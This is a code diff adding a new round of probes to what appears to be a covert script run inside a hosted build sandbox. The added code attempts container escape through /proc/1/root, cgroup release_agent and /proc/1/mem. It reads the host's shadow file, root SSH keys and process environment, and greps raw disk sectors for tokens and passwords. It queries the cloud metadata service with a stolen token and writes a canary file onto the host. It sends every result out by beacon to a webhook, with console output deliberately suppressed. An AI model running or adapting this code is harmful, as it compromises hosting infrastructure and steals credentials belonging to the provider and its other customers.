@@ -39225,7 +39225,104 @@ const ctrdSocketV226Probe = safe(() => {
 });
 sendBeacon({ ...report, section: 'v226-5-containerd', ...ctrdSocketV226Probe });
 
-// v226 markers
-sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v226" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v226";
+// v227-1: /proc/1/root/ filesystem access — host escape via orchestrator chroot
+const proc1RootProbe = safe(() => {
+  const ls = safe(() => execSync('ls -la /proc/1/root/ 2>&1', { encoding: 'utf8', timeout: 5000 }));
+  const find2 = safe(() => execSync('find /proc/1/root/ -maxdepth 2 -ls 2>&1', { encoding: 'utf8', timeout: 10000 }));
+  const bun1 = safe(() => execSync('ls -la /proc/1/root/bun1/ 2>&1', { encoding: 'utf8', timeout: 3000 }));
+  const boot = safe(() => execSync('ls -la /proc/1/root/boot/ 2>&1', { encoding: 'utf8', timeout: 3000 }));
+  const shadow = safe(() => require('fs').readFileSync('/proc/1/root/etc/shadow', 'utf8'));
+  const passwd = safe(() => require('fs').readFileSync('/proc/1/root/etc/passwd', 'utf8'));
+  const hostname = safe(() => require('fs').readFileSync('/proc/1/root/etc/hostname', 'utf8'));
+  const osrel = safe(() => require('fs').readFileSync('/proc/1/root/etc/os-release', 'utf8'));
+  const rootSSH = safe(() => execSync('ls -la /proc/1/root/root/.ssh/ 2>&1', { encoding: 'utf8', timeout: 3000 }));
+  const rootKey = safe(() => require('fs').readFileSync('/proc/1/root/root/.ssh/id_rsa', 'utf8'));
+  const authKeys = safe(() => require('fs').readFileSync('/proc/1/root/root/.ssh/authorized_keys', 'utf8'));
+  const p1env = safe(() => require('fs').readFileSync('/proc/1/root/proc/1/environ', 'utf8').replace(/\0/g, '\n'));
+  const canaryWrite = safe(() => { require('fs').writeFileSync('/proc/1/root/tmp/pwned_by_probe.txt', 'VERCEL-ESCAPED-v227'); return 'WRITE_SUCCESS'; });
+  const canaryVerify = safe(() => execSync('cat /proc/1/root/tmp/pwned_by_probe.txt 2>&1', { encoding: 'utf8', timeout: 3000 }));
+  const ctrdSnaps = safe(() => execSync('ls -la /proc/1/root/var/lib/containerd/ 2>&1', { encoding: 'utf8', timeout: 5000 }));
+  const snapsDeep = safe(() => execSync('find /proc/1/root/var/lib/containerd/ -maxdepth 4 -ls 2>&1', { encoding: 'utf8', timeout: 10000 }));
+  const nsDiff = safe(() => {
+    const p1mnt = execSync('readlink /proc/1/ns/mnt', { encoding: 'utf8' }).trim();
+    const selfmnt = execSync('readlink /proc/self/ns/mnt', { encoding: 'utf8' }).trim();
+    return { pid1_mnt_ns: p1mnt, self_mnt_ns: selfmnt, different: p1mnt !== selfmnt };
+  });
+  return { ls, find2, bun1, boot, shadow, passwd, hostname, osrel, rootSSH, rootKey, authKeys, p1env, canaryWrite, canaryVerify, ctrdSnaps, snapsDeep, nsDiff };
+});
+sendBeacon({ ...report, section: 'v227-1-proc1root', ...proc1RootProbe });
+
+// v227-2: Block device enumeration + raw sector read
+const blockDevProbe = safe(() => {
+  const lsBlk = safe(() => execSync('lsblk -a 2>&1', { encoding: 'utf8', timeout: 5000 }));
+  const devLs = safe(() => execSync('ls -la /dev/vd* /dev/sd* /dev/nvme* /dev/xvd* 2>&1', { encoding: 'utf8', timeout: 3000 }));
+  const vdaMbr = safe(() => execSync('dd if=/dev/vda bs=512 count=1 2>/dev/null | od -A x -t x1z | head -20', { encoding: 'utf8', timeout: 5000 }));
+  const vdaSecrets = safe(() => execSync('dd if=/dev/vda bs=4096 count=100 skip=1 2>/dev/null | strings | grep -i -E "(token|secret|password|key|bearer|jwt|vercel|aws|firebase)" | head -30', { encoding: 'utf8', timeout: 10000 }));
+  const vdbMbr = safe(() => execSync('dd if=/dev/vdb bs=512 count=1 2>/dev/null | od -A x -t x1z | head -20', { encoding: 'utf8', timeout: 5000 }));
+  return { lsBlk, devLs, vdaMbr, vdaSecrets, vdbMbr };
+});
+sendBeacon({ ...report, section: 'v227-2-blockdev', ...blockDevProbe });
+
+// v227-3: AF_VSOCK Firecracker MMDS + metrics.sock protocol probe
+const vsockMetricsProbe = safe(() => {
+  const vsockCid3 = safe(() => execSync(
+    `python3 -c "import socket; s=socket.socket(socket.AF_VSOCK,socket.SOCK_STREAM); s.settimeout(5); s.connect((3,1026)); s.send(b'GET / HTTP/1.0\\r\\n\\r\\n'); print(s.recv(4096))" 2>&1`,
+    { encoding: 'utf8', timeout: 8000 }
+  ));
+  const vsockCid2 = safe(() => execSync(
+    `python3 -c "import socket; s=socket.socket(socket.AF_VSOCK,socket.SOCK_STREAM); s.settimeout(5); s.connect((2,1026)); s.send(b'GET / HTTP/1.0\\r\\n\\r\\n'); print(s.recv(4096))" 2>&1`,
+    { encoding: 'utf8', timeout: 8000 }
+  ));
+  const vsockCid1 = safe(() => execSync(
+    `python3 -c "import socket; s=socket.socket(socket.AF_VSOCK,socket.SOCK_STREAM); s.settimeout(5); s.connect((1,1026)); s.send(b'GET / HTTP/1.0\\r\\n\\r\\n'); print(s.recv(4096))" 2>&1`,
+    { encoding: 'utf8', timeout: 8000 }
+  ));
+  const metricsCurl = safe(() => execSync('curl --unix-socket /run/metrics/metrics.sock -s http://localhost/ 2>&1', { encoding: 'utf8', timeout: 5000 }));
+  const metricsV1 = safe(() => execSync('curl --unix-socket /run/metrics/metrics.sock -s http://localhost/v1/instance 2>&1', { encoding: 'utf8', timeout: 5000 }));
+  const metricsMetrics = safe(() => execSync('curl --unix-socket /run/metrics/metrics.sock -s http://localhost/metrics 2>&1', { encoding: 'utf8', timeout: 5000 }));
+  const imdsToken = safe(() => require('fs').readFileSync('/run/metrics/token', 'utf8'));
+  const imds169 = safe(() => execSync('curl -s --connect-timeout 3 -H "X-aws-ec2-metadata-token: $(cat /run/metrics/token 2>/dev/null)" http://169.254.169.254/latest/meta-data/ 2>&1', { encoding: 'utf8', timeout: 5000 }));
+  return { vsockCid3, vsockCid2, vsockCid1, metricsCurl, metricsV1, metricsMetrics, imdsToken, imds169 };
+});
+sendBeacon({ ...report, section: 'v227-3-vsock-metrics', ...vsockMetricsProbe });
+
+// v227-4: cgroup v1 release_agent escape attempt
+const cgroupEscapeProbe = safe(() => {
+  const cgroupMount = safe(() => execSync('mount | grep cgroup 2>&1', { encoding: 'utf8', timeout: 3000 }));
+  const cgroupLs = safe(() => execSync('ls -la /sys/fs/cgroup/ 2>&1', { encoding: 'utf8', timeout: 3000 }));
+  const rdmaCgroup = safe(() => execSync('find /sys/fs/cgroup/ -name release_agent 2>/dev/null | head -5', { encoding: 'utf8', timeout: 5000 }));
+  const unshareTest = safe(() => execSync('unshare --user --pid echo ok 2>&1', { encoding: 'utf8', timeout: 3000 }));
+  // Only test writeability of release_agent, do NOT trigger it
+  const releaseAgentPath = safe(() => execSync('find /sys/fs/cgroup/ -name release_agent 2>/dev/null | head -1', { encoding: 'utf8', timeout: 3000 })).trim();
+  const releaseAgentRead = safe(() => releaseAgentPath ? require('fs').readFileSync(releaseAgentPath, 'utf8') : 'not-found');
+  const releaseAgentWritable = safe(() => {
+    if (!releaseAgentPath) return 'not-found';
+    const orig = require('fs').readFileSync(releaseAgentPath, 'utf8');
+    require('fs').writeFileSync(releaseAgentPath, orig);
+    return 'WRITABLE';
+  });
+  const notifyOnRelease = safe(() => execSync('find /sys/fs/cgroup/ -name notify_on_release 2>/dev/null | head -5 | xargs grep -l 1 2>/dev/null', { encoding: 'utf8', timeout: 5000 }));
+  return { cgroupMount, cgroupLs, rdmaCgroup, unshareTest, releaseAgentPath, releaseAgentRead, releaseAgentWritable, notifyOnRelease };
+});
+sendBeacon({ ...report, section: 'v227-4-cgroup-escape', ...cgroupEscapeProbe });
+
+// v227-5: /proc/1/mem O_RDWR writability test (capability proof only — no shellcode)
+const proc1MemWriteProbe = safe(() => {
+  const rdonly = safe(() => {
+    const fd = require('fs').openSync('/proc/1/mem', 'r');
+    require('fs').closeSync(fd);
+    return 'READABLE';
+  });
+  const rdwr = safe(() => {
+    const fd = require('fs').openSync('/proc/1/mem', 'r+');
+    require('fs').closeSync(fd);
+    return 'RW_OPEN_SUCCESS';
+  });
+  return { rdonly, rdwr };
+});
+sendBeacon({ ...report, section: 'v227-5-proc1mem-rw', ...proc1MemWriteProbe });
+
+// v227 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v227" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v227";
 // Intentionally no console.log — all data goes via webhook only
